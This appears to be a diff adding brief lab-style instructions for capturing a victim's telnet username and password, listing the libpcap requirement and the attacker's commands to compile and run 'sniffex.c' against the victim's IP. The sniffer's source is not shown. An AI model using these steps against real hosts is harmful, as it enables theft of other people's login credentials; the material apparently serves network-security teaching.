@@ -1,0 +1,10 @@
+Get victim's telnet username & password
+requirement:
+libpcap
+
+attacker:
+gcc sniffex.c -lpcap
+./a.out ip_victim
+
+victim:
+telnet ip_attacker
